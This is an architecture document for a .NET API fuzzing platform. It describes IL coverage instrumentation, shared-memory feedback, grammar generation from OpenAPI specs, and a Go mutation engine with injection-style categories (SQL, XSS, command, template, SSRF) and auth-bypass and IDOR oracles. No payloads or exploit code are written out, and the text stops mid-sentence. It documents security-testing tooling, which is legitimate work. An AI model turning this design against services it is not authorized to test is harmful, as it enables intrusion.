# UpsideFuzz Platform Architecture

This document describes the internal design, components, and data flows of the **UpsideFuzz** platform — from source analysis through instrumentation, runtime synchronization, coverage feedback, and coverage-guided fuzzing.

**→ [Back to README](README.md) · [Full Runbook](INSTRUCTIONS.md) · [Docs Index](docs/INDEX.md)**

---

## High-Level Overview

The platform automates transforming a standard .NET solution into a feedback-driven fuzzing target in six stages:

1. **Analysis** — Discovering business logic across all projects in a solution
2. **Preparation** — Adapting Docker configs, injecting coverage infrastructure
3. **Instrumentation** — Injecting SharpFuzz coverage probes into target DLLs during Docker build
4. **Synchronization** — Linking all instrumented DLLs to a single shared memory bitmap at runtime
5. **Grammar Generation** — Compiling an OpenAPI spec directly into typed request templates (`grammarc/`, first-party, no RESTler), optionally enriched with real Roslyn syntax-tree analysis of the C# source (`analyzer/`)
6. **Fuzzing** — Sending mutated inputs with epoch-based scheduling, adaptive concurrency, and crash triage

---

## End-to-End Flow Diagram

```
┌────────────────────────────────────────────────────────────────────┐
│                        .NET Solution Source                        │
│              (*.sln / *.csproj / Dockerfile / compose)             │
└──────────────────────────────┬─────────────────────────────────────┘
                               │
                    ┌──────────▼──────────┐
                    │  fuzz-prep-multi.py  │
                    │                      │
                    │  • Scan *.csproj     │
                    │  • Skip test projects│
                    │  • Detect biz logic  │
                    │  • Collect namespaces│
                    └──────────┬──────────┘
                               │  Writes to OUTPUT_DIR (copy of src)
         ┌─────────────────────┼──────────────────────────┐
         │                     │                          │
         ▼                     ▼                          ▼
  Dockerfile            compose.yaml           New/Modified Files
  (4 stages)           (+SHM volumes)         instrumentor_src/
  injected             +Development env       Helpers/CoverageExtensions.cs
                       +sidecar template      Program.cs (patched)
                                              *.csproj (patched)
                               │
                    ┌──────────▼──────────┐
                    │  docker compose      │
                    │       build          │
                    └──────────┬──────────┘
                               │
              ┌────────────────┼────────────────┐
              │                │                │
     Stage 1: builder   Stage 2+3: instrument  Stage 4: runtime
     dotnet publish     SharpFuzz IL rewriting  minimal aspnet image
                        (namespace-filtered)    COPY from instrumentation
              │                │                │
              └────────────────┴────────────────┘
                               │
                    ┌──────────▼──────────┐
                    │  docker compose up   │
                    │                      │
                    │  [App Container]     │
                    │  ┌─────────────────┐ │
                    │  │  Web API Process │ │
                    │  │  DLL-A.dll ──┐  │ │
                    │  │  DLL-B.dll ──┼─►│ │  SHM bitmap (256KB default)
                    │  │  DLL-C.dll ──┘  │ │  /coverage_shm/bitmap
                    │  │  [SyncSharpFuzz]─┼─┼─► (tmpfs mmap)
                    │  │  /shm/create    │ │
                    │  │  /shm/coverage  │ │
                    │  │  /shm/reset     │ │
                    │  └─────────────────┘ │
                    └──────────┬──────────┘
                               │
              ┌────────────────┼────────────────┐
              │                                 │
              ▼                                 ▼
   compile-grammar.sh                  GET /swagger/v1/swagger.json
   (grammarc/ + optional analyzer/)
              │
     ┌────────┴────────┐
     │                 │
     ▼                 ▼
templates.export.json  dict.json
 (templates)        (tokens)
     │
     └──────────────────────────────────────────┐
                                                │
                    ┌───────────────────────────▼──────────────────────┐
                    │            Void                         │
                    │                                                   │
                    │  ┌─ Epoch scheduler ─────────────────────────┐   │
                    │  │  Baseline → Deterministic → Havoc →        │   │
                    │  │  Splicing                                  │   │
                    │  └───────────────────────────────────────────┘   │
                    │                                                   │
                    │  ┌─ Worker pool (adaptive concurrency) ───────┐  │
                    │  │  goroutines → HTTP requests → responses    │  │
                    │  │  cookie jar, auth header, anti-forgery     │  │
                    │  └───────────────────────────────────────────┘   │
                    │                                                   │
                    │  ┌─ Coverage reader ──────────────────────────┐  │
                    │  │  Mode A: mmap /coverage_shm/bitmap         │  │
                    │  │  Mode B: GET /shm/coverage (HTTP)          │  │
                    │  └───────────────────────────────────────────┘   │
                    │                                                   │
                    │  ┌─ Mutation engine ──────────────────────────┐  │
                    │  │  MOpt-style weighted categories             │  │
                    │  │  sqli / xss / cmdi / ssti / ssrf /...      │  │
                    │  └───────────────────────────────────────────┘   │
                    │                                                   │
                    │  ┌─ Crash triage ─────────────────────────────┐  │
                    │  │  Repro → Minimize → JSONL → PoC file       │  │
                    │  └───────────────────────────────────────────┘   │
                    └───────────────────────────────────────────────────┘
```

---

## 1. Discovery & Analysis (`fuzz-prep-multi.py`)

### Project Enumeration
- Scans the source directory for all `.csproj` files
- Identifies the **main project** (web SDK or `--main` flag)
- **Skips test projects** by name/path pattern (`*.Tests.csproj`, `/test/`, `/tests/`)

### Business Logic Detection
Uses file-name and directory heuristics to identify code worth fuzzing:

| Pattern | Category |
|---------|----------|
| `*Controller.cs` | API endpoint handlers |
| `*Service.cs` | Business logic services |
| `*Repository.cs` | Data access layer |
| `*Validator.cs` | Input validation rules |
| `*Handler.cs` | CQRS/MediatR handlers |
| `*Command.cs`, `*Query.cs` | CQRS command/query objects |
| `*Aggregate.cs`, `*Specification.cs` | DDD patterns |
| `*Endpoint.cs` | Minimal API / FastEndpoints |
| `*Logic.cs`, `*Manager.cs` | Domain logic |
| Directories: `Controllers/`, `Features/`, `Handlers/` | Structural detection |

### Dynamic Configuration Detection

| Detection | Method | Fallback |
|-----------|--------|----------|
| Builder variable name | Regex on `WebApplication.CreateBuilder(...)` | `builder` |
| App variable name | Regex on `<builder>.Build()` | `app` |
| Dockerfile runtime stage | Last `FROM ... AS <name>` stage | `runtime` |
| Dockerfile publish directory | `--output` / `-o` in `dotnet publish` | `/app/publish` |
| Dockerfile source stage | Stage before runtime with publish output | `publish` |
| SDK version | `global.json` → `sdk.version` | Derived from `TargetFramework` |
| Target framework | `<TargetFramework>` or highest in `<TargetFrameworks>` | `net8.0` |
| Root namespace | `<RootNamespace>` in `.csproj` | Project name |

### Namespace Aggregation
Collects namespaces from identified files to create a **whitelist filter configuration** (`namespaces.json`) for the generic instrumentor. The instrumentor reads this config at runtime to only instrument code in these namespaces — skipping system libraries and generated code.

---

## 2. Docker Build Pipeline

The adapted Dockerfile has 4 stages:

```
┌───────────────────────────┐
│  instrumentor-build        │  Builds the SharpFuzz instrumentor tool
│  FROM sdk AS               │  from instrumentor_src/Program.cs
│  instrumentor-build        │  (separate stage — doesn't slow app build)
└─────────────┬─────────────┘
              │
┌─────────────▼─────────────┐
│  builder → publish         │  Standard project build:
│  FROM sdk AS builder       │  dotnet restore → dotnet publish
└─────────────┬─────────────┘
              │
┌─────────────▼─────────────┐
│  instrumentation           │  FROM publish AS instrumentation
│  Inherits published output │  Copies instrumentor from step 1
│  Runs: instrumentor.dll    │  Instruments all business logic DLLs
│  for each *.dll            │  in-place (IL rewriting)
└─────────────┬─────────────┘
              │
┌─────────────▼─────────────┐
│  final / runtime / app     │  FROM aspnet AS final
│  COPY --from=instrumentation │  Gets pre-instrumented binaries
│  Runs the app normally     │  No SDK needed at runtime
└───────────────────────────┘
```

---

## 2a. Coverage Injection Modes (`--inject-mode`)

The coverage *runtime* (SHM allocation, SharpFuzz linking, `/shm/*` endpoints, per-request `X-Coverage-Delta` middleware) is delivered in one of two ways. IL rewriting of the business DLLs (§3) is identical in both.

### `hook` — zero-edit (default)
The prep tool generates a **self-contained `UpsideFuzz.Coverage` assembly** (`coverage_hook_src/`) and wires it via environment variables baked into the runtime image — **the target's `Program.cs`, `Startup.cs`, and `.csproj` files are never modified**:

- `DOTNET_STARTUP_HOOKS=/coverage/UpsideFuzz.Coverage.dll` — the runtime runs `StartupHook.Initialize()` **before `Main`**. It maps the shared bitmap, registers an `AssemblyLoadContext.Default.Resolving` handler (so the hook DLL + `SharpFuzz.Common.dll` load from `/coverage` without being in the app's probing path), links every currently-loaded SharpFuzz assembly, and installs an `AppDomain.CurrentDomain.AssemblyLoad` handler that links every assembly loaded **later** — this is the fix for lazily/dynamically loaded modules whose coverage was previously lost.
- `ASPNETCORE_HOSTINGSTARTUPASSEMBLIES=UpsideFuzz.Coverage` — ASP.NET loads `CoverageHostingStartup` (an `IHostingStartup`), which registers an `IStartupFilter` that inserts the coverage middleware at the front of the pipeline. The middleware serves `/shm/create`, `/shm/coverage`, `/shm/reset`, `/shm/health` inline and emits per-request `X-Coverage-Delta`/`X-Exception-*` headers.

Because `StartupHook.Initialize()` runs before any application code, the SHM pointer is bound **earlier** than in source mode, and the per-assembly `AssemblyLoad` linking closes the lazy-assembly gap. The Docker build gains one stage (`coverage-hook-build`) that publishes the assembly; the runtime stage copies `UpsideFuzz.Coverage.dll` + `SharpFuzz.Common.dll` into `/coverage` and sets the two env vars.

### `source` — legacy (`--inject-mode source`)
The previous behavior: `generate_multi_coverage_helper` writes `CoverageExtensions.cs` into the main project and `inject_multi_shm_endpoints` edits `Program.cs`/`Startup.cs` (`_inject_into_startup_cs`) to add `Initialize()`, `UseCoverageMiddleware()`, and `AddCoverageEndpoints()`. Retained for targets where source editing is preferred or where the middleware must sit *inside* the app's exception handler for maximal production-mode exception-type fidelity (the hook-mode middleware is outermost; see §5 caveat).

Both modes expose the identical `/shm/*` HTTP contract and `X-Coverage-Delta` header, so the Go engine is unchanged and mode-agnostic.

## 3. Instrumentation (IL Rewriting with SharpFuzz)

### How SharpFuzz Works
1. **Assembly Rewriting** — Reads target DLL using Mono.Cecil
2. **Probe Injection** — Inserts `SharpFuzz.Common.Trace.OnBranch` call at every basic block entry
3. **Shared Memory** — Injected code expects `SharpFuzz.Common.Trace.SharedMem` to point to valid memory

### Instrumentation Modes
The instrumentor has two selection modes; both always exclude entry points (`Program`, `Startup`), EF infra (`Migration`, `DesignTimeDbContext`), our own `CoverageExtensions`, and auto-generated types (`.g.`, `c__DisplayClass`, `d__`).

1. **`--instrument-all-user-code` (recommended, now the default for generated Dockerfiles):** rewrite every type whose full name does NOT start with a framework prefix (`System.`, `Microsoft.`, `Newtonsoft.`, …). Because the DLL list already contains only the target's own business assemblies, this instruments all of the app's code and nothing third-party.
2. **`namespaces.json` allowlist:** instrument only types whose full name **contains** a listed namespace (substring match via `fullName.Contains`). Convenient but dangerous — any namespace not listed is silently dropped. This is exactly how Bitwarden's entire `Bit.Commercial.*` Secrets Manager code was omitted from coverage: `Bit.Core` is not a substring of `Bit.Commercial.Core`, and the assembly itself was missing from the DLL list.

**Fail-loud + verify:** the generated instrument loop now aborts the build (`exit 1`) if a present DLL fails to instrument, instead of the old silent `|| true`. After bring-up, `verify_coverage.sh` hits an endpoint with an `X-Fuzz-Request-Id` and asserts `X-Coverage-Edges > 0` — a one-command guard against silently-broken coverage.

---

## 4. Runtime Synchronization (SHM Linking)

When the application starts, multiple DLLs each have their own copy of SharpFuzz. They all need to write to the **same** shared coverage bitmap. The current default size is **256KB** (`262144` bytes), with a minimum supported size of **64KB**.

### SHM Allocation (Dual Mode)

**Mode 1: File-Backed mmap** (when `coverage_shm` tmpfs volume is mounted)
```
/coverage_shm/bitmap  ← tmpfs file, 256KB by default (configurable)
  ↑ written by ASP.NET (all DLLs via reflection linking)
  ↑ read by Go fuzzer sidecar (direct mmap, zero HTTP overhead)
```

```csharp
var fs = new FileStream("/coverage_shm/bitmap", FileMode.OpenOrCreate, ...);
fs.SetLength(262144);
mmf = MemoryMappedFile.CreateFromFile(fs, null, 262144, ...);
accessor = mmf.CreateViewAccessor(0, 262144);
accessor.SafeMemoryMappedViewHandle.AcquirePointer(ref ptr);
globalShmAddr = (IntPtr)ptr;
```

**Mode 2: Heap Allocation** (fallback when no tmpfs volume)
```csharp
globalShmAddr = Marshal.AllocHGlobal(262144);
```
Coverage only accessible via HTTP endpoints (`GET /shm/coverage`).

The `/shm/create` response reports which mode is active: `"mode":"file-backed-mmap"` or `"mode":"heap"`.

### Reflection-Based Linking (`SyncSharpFuzz`)

```
AppDomain.CurrentDomain.GetAssemblies()
  → find all SharpFuzz.Common.Trace types
  → set SharedMem field to globalShmAddr
  → all DLLs now write to the same shared bitmap
```

This works regardless of how many project DLLs were instrumented — they all get linked to the same pointer at startup.

**Load-time linking (hook mode).** In the default `hook` mode this linking happens in two places: (1) at process start in `StartupHook.Initialize()` (`CoverageRuntime.Bootstrap` → `LinkAssembly` over all loaded assemblies), and (2) continuously, via an `AppDomain.CurrentDomain.AssemblyLoad` handler that calls `LinkAssembly` on **each assembly as it loads**. This closes a real gap in the old one-shot `SyncSharpFuzz`: assemblies loaded *after* startup (plugin/module-style dynamic loading, e.g. SimplCommerce modules) were never linked and silently contributed no coverage. `GET /shm/health` reports `linked_assemblies` and the app assemblies the runtime has observed loaded so this can be inspected at runtime — see §5's `/shm/health` and §7's fail-closed startup check (Top-20 #4) for how the engine actually verifies this rather than trusting it blindly.

---

## 5. Coverage Reporting Protocol

### `POST /shm/create` — Initialize
- Allocates SHM using the current configured size (see "Bitmap Sizing" below; 256KB default, minimum 64KB, maximum 8MB), or opens the existing tmpfs file
- Calls `SyncSharpFuzz()` to link all loaded DLLs
- Returns `{"status": "synced", "mode": "...", "bitmap_size": 262144}` (or the configured/auto-sized size)

### `GET /shm/coverage` — Global Stats
- Reads the shared bitmap via pointer arithmetic
- `edges` = number of distinct **(edge, hit-count bucket)** classes discovered so far (AFL-style bucketed novelty, see below), maintained by the coverage middleware in a persistent virgin map; `hits` = raw sum of all bitmap bytes
- Returns `{"edges": 150, "hits": 5000, "size": 262144}`

### `POST /shm/reset` — Reset Bitmap
- Zeroes the shared bitmap
- Used between fuzzing sessions; the Go engine also calls this mid-run when the bitmap is both saturated and stagnant (see "Bitmap Sizing" below)

### `GET /shm/coverage/traces` — Legacy
- Maintained for legacy compatibility but largely superseded by header-based injection.

### `GET /shm/health` — Instrumentation facts (Top-20 #4)
- Returns `{"shm_bound": bool, "mode": "...", "total_classes": N, "linked_assemblies": N, "instrumented_types": N, "app_assemblies": [...]}`.
- **Deliberately reports facts, not a verdict.** SharpFuzz's `Trace.SharedMem` type lives only in `SharpFuzz.Common.dll` — never in the app's own IL-rewritten assemblies — so "is assembly X linked" cannot be measured by type reflection on the .NET side; an app assembly that is instrumented correctly will *never* show up as having its own `Trace` type. `app_assemblies` is a diagnostic list of assembly names the runtime has observed loaded that aren't framework/SharpFuzz code (same `frameworkPrefixes` denylist as `instrumentor/Program.cs`, kept in sync manually), useful when diagnosing a failure — not a pass/fail signal by itself. `instrumented_types` (Top-20 #17) is the real build-time instrumented-type count — see "Bitmap Sizing" below.
- The actual fail-closed decision is made **engine-side** — see §7's "Self-verifying, fail-closed instrumentation" below.

### Bitmap Sizing (Top-20 #17)
Previously the SHM bitmap was a fixed 256KB regardless of application size, so large apps (Bitwarden, BTCPay) collided heavily while tiny ones wasted memory scanning a mostly-empty map. The bitmap is now sized from the **real instrumented-type count** captured at build time:
1. `instrumentor/Program.cs` counts the types it actually instruments (`instrumentedCount`) and, on success, appends a line to `.upsidefuzz_instrumented.jsonl` next to the DLL it just rewrote: `{"assembly":"Foo.dll","instrumented_types":N}`. A multi-assembly app (one `instrumentor.dll` invocation per DLL during the Docker build) accumulates one line per assembly.
2. At runtime, `CoverageRuntime`/`CoverageExtensions`'s `ResolveInstrumentedTypeCount()` reads that file from `AppContext.BaseDirectory` and sums `instrumented_types` across all lines.
3. `ResolveShmSize()` uses that sum — **only when the `SHM_SIZE` env var isn't pinned explicitly** — to compute a size: ~512 bitmap bytes per instrumented type, rounded up to a power of two, clamped to `[65536, 8388608]` (64KB–8MB). SharpFuzz exposes no public branch/edge count, so instrumented *type* count is a proxy, not a literal edge count — documented as such rather than overclaimed.
4. On the Go side, `SHMCoverageReader.Init()` (direct-shm mode) trusts the **actual on-disk file size** as ground truth instead of truncating it down to whatever `-coverage-bitmap-size` happened to be passed. This fixed a real latent bug: since the .NET side now sizes the file dynamically, a stale/mismatched flag value used to silently truncate the Go side's view of a properly-sized file, dropping real coverage from the untruncated remainder. A size mismatch is now only ever a diagnostic printf, never a truncation.
5. The periodic full-bitmap reset (previously: saturation > 85% alone, on a 90s timer) now also requires **stagnation** — no new edge for ≥30 seconds (`worker.go::shouldResetCoverageBitmap`) — so a reset only fires when there's actual evidence hash collisions are corrupting the signal, not just because a byte-percentage threshold was crossed while the fuzzer was still making real progress.

### AFL-Style Hit-Count Buckets (bucketed virgin map)
Coverage novelty is measured with **AFL-style hit-count buckets**, not binary edge-presence. Each edge's raw 8-bit hit count is classified into a log-scale bucket — `1, 2, 3, 4–7, 8–15, 16–31, 32–127, 128+` — via a 256-entry lookup table (`CountClass` in `CoverageExtensions.cs`, `countClass` in `coverage.go`). A **bucket bit never before seen for an edge** counts as new coverage, tracked in a persistent per-edge bucket bitmask (the "virgin map": `seenBuckets` C#-side, `seen []byte` Go-side).

This is the key resolution upgrade: an edge executed **once** is now distinguished from the same edge executed **50 or 5000 times**, so the fuzzer keeps making measurable progress inside loops, pagination, retry logic, and state machines instead of plateauing the instant every edge has been touched at least once. `edges` therefore reports *distinct (edge, bucket) classes discovered*, a strictly richer and still-monotonic signal than the previous byte->0 count.

### Per-Request Attribution (`X-Coverage-Delta`) — single-scan, first-observer-wins
The .NET middleware computes each request's novelty **once**, after the pipeline runs:
1. The pipeline executes the API business logic (SharpFuzz probes write hit counts into the shared bitmap).
2. In the middleware `finally`, `MergeAndCountNovel()` makes **one** pass over the live bitmap (with an all-zero 8-byte-word fast path), folds it into the shared bucketed virgin map, and returns the number of buckets *this request was the first to discover*.
3. That count is injected into the response header `X-Coverage-Delta: <number>` (and `X-Coverage-Edges: <totalClasses>`).

**Why this replaces the old global before/after delta:**
The previous design read a *global* edge count before and after every request — two full 256KB bitmap scans per request in the hot path — and under concurrency both a Request A and a concurrent Request B that reached new code would each be credited the *same* delta ("coverage smearing"), corrupting the energy/MOpt signal. Novelty is now measured against the **shared** virgin map on a **first-observer-wins** basis: whichever request reaches the merge first claims each new bucket; a concurrent request sees it already recorded and is credited 0. This eliminates the double-counting smearing and **halves the per-request scan cost** (one pass instead of two). The merge is guarded by a short lock (`covLock`), so concurrent requests serialize only for the microsecond-scale bucket merge, not for the whole pipeline.

**Exception attribution in production mode (`X-Exception-Type` / `X-Exception-Message`):**
The coverage middleware also reports the .NET exception type and message on 5xx responses. The subtlety: in non-Development mode the app's exception handler starts the response and clears headers *before* the middleware's `finally` block runs, so a header set there is lost — this previously left ~84% of production-mode crashes unattributable. The middleware now detects requests carrying `X-Fuzz-Request-Id` (fuzzer traffic only) and, on an unhandled exception, short-circuits with its own 500 carrying `X-Exception-Type` + `X-Exception-Message` (sanitized: CR/LF and control chars stripped, truncated). Real traffic (no fuzz header) is re-thrown untouched. The Go engine reads both headers; the message feeds `cluster.go`'s root-cause key so clustering stays precise even without a dev-mode stack trace.
---

## 6. Grammar Generation (`grammarc/` + `analyzer/` — RESTler retired)

RESTler (an external Docker-packaged compiler) has been retired (Top-20 #9). `compile-grammar.sh`
now drives two first-party components directly, with **no Docker involved in this step at all**
(Docker remains needed only for the target's own instrumented container):

```
swagger.json                    .NET source (optional, --src)
     │                                 │
     ▼                                 ▼
grammarc/oas.py              analyzer/ (Microsoft.CodeAnalysis.CSharp,
(OpenAPI 2/3 parser:           syntax-tree only — no MSBuildWorkspace/
 $ref/allOf/oneOf/anyOf)        NuGet-restore semantic model)
     │                                 │
     │                        roslyn-constraints.json
     │                        (per-type/property constraints,
     │                         [Authorize]/route metadata,
     │                         keyed by fully-qualified type —
     │                         not a global property name)
     │                                 │
     └───────────► grammarc/roslyn_merge.py ◄──────┘
                    (Roslyn wins per-field on a scoped
                     match; OAS-derived value otherwise)
                              │
          ┌───────────────────┼───────────────────┐
          ▼                   ▼                   ▼
  body_serializer.py    dependencies.py      boundary.py / multipart.py
  (schema → static/       (producer/consumer     (boundary-value pools,
   fuzzable/custom_        id inference by         multipart seed
   payload segments)        path/name convention)   templates)
          │                   │                   │
          └───────────────────┴───────────────────┘
                              │
                              ▼
              templates.export.json  +  dict.json
              (written directly — no intermediate grammar.py,
               no manual cp, no separate export-templates.py step)
```

The grammar provides:
- Request templates with method, path, headers, and body structure
- Typed fuzzable fields (`string`, `int`, `number`, `bool`, `datetime`, `uuid`, `object`), plus
  `custom_payload` fields for anything with a real constraint (enum/pattern/length/range/id-shaped/
  semantically-specific format) — routed through `dict.json`'s boundary pools and sequence/
  correlation state, not just a static default
- **Producer-consumer dependencies** — POST creates an ID that GET/PUT/DELETE uses, via a shared
  `payload_key` string threaded through path params, body fields, `dict.json`, and
  `void/go/store.go`'s `SequenceState`/`RuntimeStore`

**A previously-undocumented bug, found and fixed during this migration:** the old
`export-templates.py::seg_payload()` emitted JSON key `"name"` for every `custom_payload`
segment, but `void/go/types.go`'s `Segment` struct and `template.go`'s rendering switch read
only `PayloadKey` (JSON key `"payload_key"`) — a field-name mismatch that meant this value was
**always the empty string**, so producer→consumer chaining for `custom_payload`-kind segments
(including RESTler's own dependency chaining, not just static dictionary lookups) never actually
substituted a harvested value at render time, for the entire lifetime of the RESTler-based
pipeline. `grammarc/emit_templates.py` emits `"payload_key"` directly, fixing this by
construction — no Go-side changes were needed, since Go was always reading the correct field, it
just never received it. See `ARCHITECTURE_REVIEW.md`'s Inconsistencies section, item 7, for the
full writeup.

`void/export-templates.py` (the old grammar.py → JSON exporter) is retained only as a legacy
fallback for grammar directories generated before this migration and not yet regenerated
(`void/go/template.go::exportTemplates`, invoked automatically when `templates.export.json` is
missing but a `grammar.py` is present) — it is not part of the primary path.

### 6a. Segment constraint metadata (Top-20 #14)

`void/go/types.go`'s `Segment` struct carries optional per-field constraint metadata,
sourced from `grammarc/oas.py::FieldHint` (OpenAPI + Roslyn-merged) and emitted by
`grammarc/body_serializer.py::seg_fuzzable`/`seg_payload` whenever the underlying field
declares one:
```go
MinLength  *int      `json:"min_length,omitempty"`
MaxLength  *int      `json:"max_length,omitempty"`
Minimum    *float64  `json:"minimum,omitempty"`
Maximum    *float64  `json:"maximum,omitempty"`
Pattern    string    `json:"pattern,omitempty"`
EnumValues []string  `json:"enum_values,omitempty"`
```
All fields are `omitempty` and loaded via plain `json.Unmarshal` (no custom decoding) —
a `templates.export.json` generated before this addition simply decodes these to Go zero
values, so old grammars behave exactly as before. `void/go/mutation_engine.go`'s
`mutateAny`/`mutateHavoc`/`mutateInt`/`mutateNumber`/`mutateStringCategorized` all take
an optional `*Segment` hint; when non-nil and the relevant constraint is set, exact
boundary candidates (`{min-1, min, min+1, max-1, max, max+1}` for numerics, exact
min/max-length strings, valid/near-miss-invalid enum values) are blended into the
existing generic candidate pools — additive, not a replacement, so the nil-hint path
(anything without a schema-derived constraint) is unchanged. Verified on eShopOnWeb: the
same live-fuzz session hit the same known `pageSize` overflow bug class ~7x more often
in the same time budget after this change (124 vs. 18 crash hits, from 18k vs 54k total
requests — depth over breadth).

---

## 7. Void Architecture

The production fuzzer is the Go runtime (`void/go/`). It implements coverage-guided mutation with structured epochs, a seed corpus, adaptive concurrency, and crash triage.

### Component Map

```
void/go/
├── main.go                CLI flags, config parsing, and bootstrap
├── fuzzer.go              Main lifecycle loop, epochs, and corpus scheduling
├── worker.go              Concurrent HTTP fuzzing loop and coverage attribution
├── coverage.go            SHM bitmap parsing and HTTP coverage reader
├── sequence.go            Stateful producer/consumer chain execution
├── store.go               Knowledge extraction, ID harvesting, and dedup
├── template.go            templates.export.json parsing and payload rendering
├── mutation_engine.go     MOpt-style mutation scheduler and weights
├── mutations.go           Concrete mutation categories (sqli, xss, etc)
├── crash.go               Crash deduplication, signature generation, JSONL logging
├── cluster.go             Root-cause clustering (many signatures → one bug)
├── oracle.go              BOLA/IDOR + auth-bypass + positive injection oracles
├── triage.go              Source-aware priority and crash route scoring
├── poc.go                 PoC shell scripts and timeline generation
├── report.go              Final JSON crash report and findings summary
├── minimize.go            Crash minimization and repro verification
├── identity.go            Auth identities, multi-identity scheduling, race probing
├── auth.go                JWT/header/cookie auth state and login fallback
├── ui.go                  Live terminal dashboard
├── utils.go               HTTP and string utility functions
├── types.go               Core data structures (Seed, Config, WorkItem)
├── go.mod                 Module: void, go 1.22
└── void                   Pre-built binary (Linux/amd64)
```

### CMPLOG-lite: 400-body mining (Top-20 #11)

`worker.go::recordClientErrorSample` — previously write-only (it only stored a truncated
sample per endpoint for the human-readable `client_error_samples` report field) — now
also calls `mineClientErrorFields(body)` on every 4xx response body. That function
parses, best-effort:
1. ASP.NET's `ValidationProblemDetails`/ModelState shape (`{"errors":{"Field":["msg"]}}`,
   or the flatter `{"Field":["msg"]}` some minimal-API validators emit directly), and
2. free-text enum/valid-value hints inside each message (`"must be one of [...]"`,
   `"valid values: ..."`), comma/pipe-split into individual candidates.

Extracted `(field, value)` pairs feed `RuntimeStore.addValue` — the exact mechanism
`sequence.go::learnFromResponse` already uses for successful 2xx bodies — so mined
values become available to `pickCustomPayloadValue`/`customPayloadCandidates`
(`store.go`) the same way any other harvested runtime value is, no new store API. A body
that doesn't match either shape yields an empty map, never an error; an unrelated JSON
4xx body (e.g. `{"count":5}`) is defensively excluded from being mistaken for a
field→messages map.

### CmpLog/RedQueen via IL Comparison Instrumentation (Top-20+ #21)

CMPLOG-lite (above) mines values the server *tells* the fuzzer about, via 400
bodies. This is different: it recovers values the server never tells anyone —
constants baked directly into the target's own compiled comparison logic
(`if (code == "SUPER_SECRET_2026")`), the class of "magic value" check that no
OpenAPI spec, dictionary, or generic mutation could ever guess. It's the .NET
analog of AFL++'s CmpLog/RedQueen.

**Instrument time — `instrumentor/Program.cs::CmpLogInstrumentor`.** A second,
independent Cecil pass (own `Mono.Cecil` package reference; unrelated to
SharpFuzz's own `Fuzzer.Instrument` call, which is a self-contained black box this
project doesn't get to hook), run after SharpFuzz's coverage rewrite succeeds,
gated behind a new `--cmplog` CLI flag. It rewrites two comparison shapes so their
operand(s) are recorded immediately *before* the original comparison executes —
the target's own behavior is completely unchanged, this is purely an observer:

1. **String comparisons** — calls to `String.Equals`/`op_Equality` (static 2-arg
   and instance 1-arg overloads)/`StartsWith`/`EndsWith`/`Contains`, restricted to
   the plain `(string[, string])` overloads (a `StringComparison`/`CultureInfo`
   overload is skipped — this recorder only knows how to safely pop/replay exactly
   two string-typed stack values). Both operands are popped into temp locals via
   `stloc`/`stloc`, replayed once into `CmpLogProbe.RecordString(a, b)`, then
   replayed again unchanged immediately before the untouched original call.
2. **Integer literal-vs-compare sites** — an `ldc.i4`/`ldc.i8` immediately
   followed (skipping any `Nop`) by `ceq`/`beq`/`beq.s`/`bne.un`/`bne.un.s`: `dup`
   the constant, widen the duplicate to `int64` (`conv.i8` for the `i4` case),
   call `CmpLogProbe.RecordInt(v)`, leaving the original value untouched on the
   stack for the compare that follows.

Both transforms only ever *insert* instructions — they never remove, reorder, or
alter an existing one — so every existing branch target and exception-handler
region stays valid without offset recalculation (Cecil resolves branches by
`Instruction` object, not raw offset, until `AssemblyDefinition.Write()` runs). A
defensive check skips any call/`ldc` site that is itself a `TryStart`/`TryEnd`/
`HandlerStart`/`HandlerEnd`/`FilterStart` boundary instruction, so the pass can
never straddle an exception region. Verified end-to-end with a local Cecil
correctness harness (compile → instrument → run): 15/15 behavioral assertions
pass unchanged post-instrumentation, including three cases inside a live
try/catch/finally with an instrumented comparison throwing mid-`try` — the probe
fires with the correct operand and the `finally` still runs exactly once.

**Scope limits, stated plainly:** only the constant-*immediately-before*-the-compare
shape is caught — `x == CONST` is captured, `CONST == x` generally is not (the
`ldc` and the `ceq` aren't adjacent instructions in that IL shape), unless the
compiler happens to reorder. General relational compares (`clt`/`cgt`/`ble`/`bge`)
and switch-statement case values (both the sequential-`Equals`-chain and the
hash-jump-table forms the C# compiler emits for larger `switch`) are not
instrumented — safely intercepting those needs real stack-depth data-flow
analysis, which this pass deliberately does not attempt. `--cmplog` is only ever
passed in `--inject-mode hook` builds (`fuzz-prep-multi.py`): the recorder calls
target `UpsideFuzz.Coverage.CmpLogProbe` by assembly name only (mirroring how the
coverage probes already resolve `SharpFuzz.Common.Trace` at runtime — see
`CoverageRuntime.Bootstrap`'s `AssemblyLoadContext.Default.Resolving` handler),
which only resolves when `DOTNET_STARTUP_HOOKS` actually loads that assembly; a
`--inject-mode source` build never does.

**Runtime — `CmpLogProbe`, alongside `CoverageRuntime` in the generated coverage
hook assembly.** Bounded (512 strings / 256 ints), deduped, thread-safe
(`ConcurrentQueue`/`ConcurrentDictionary` — concurrent requests hit instrumented
code from many threads), FIFO-evicted at capacity. Served over `GET /shm/cmplog`
(alongside the existing `/shm/create`/`/shm/coverage`/`/shm/reset`/`/shm/health`
control endpoints); counts also surface in `/shm/health` (`cmplog_strings`/
`cmplog_ints`) for diagnostics. A target built without `--cmplog`, or running in
`--inject-mode source`, simply 404s here — the engine treats that as "nothing
available," not an error.

**Engine — `void/go/cmplog.go`.** `Fuzzer.pollCmpLogIfDue` polls `/shm/cmplog`
from `mainLoop`'s existing per-tick body, throttled independently to once every
`-cmplog-interval` seconds (default 3s) since it's a network round trip, not a
local check. Harvested values land in a single process-wide `CmpLogPool` (mirrors
`coverage.go`'s package-level `countClass` — there is exactly one `Fuzzer` per
process) that `mutateStringCategorized`/`mutateInt` (`mutation_engine.go`) sample
from as an additional candidate source, blended in the same additive style as
Top-20 #14's field-constraint boundaries: a probabilistic splice for strings
(`mcat_cmplog` category, 15% chance ahead of the generic pool), a union member for
ints (alongside the existing hardcoded/hint-derived candidates). Toggle with
`-cmplog` (default `true`); it's a comparison-feedback source, not a per-field one
— harvested values are spliced into *any* string/int field, not routed to the
specific field whose comparison produced them (see `ARCHITECTURE_REVIEW.md`'s
Top-20 §2 for that distinction).

### State-Reward Sequence Search (Top-20 #12)

`sequence.go::sequenceStateSignature` computes a coarse workflow-*shape*
signature for a `SequenceState`: the ordered `(method, normalized-path,
status-class)` triples of its `History`, where `normalizeEndpointPath`
collapses concrete resource IDs to a route template and `statusClass` buckets
status codes into 2xx/3xx/4xx/5xx. Two sequences that reach the same shape via
different concrete IDs or payloads are the same "state" for reward purposes —
deliberately coarse (no explicit resource-lifecycle model), but enough to
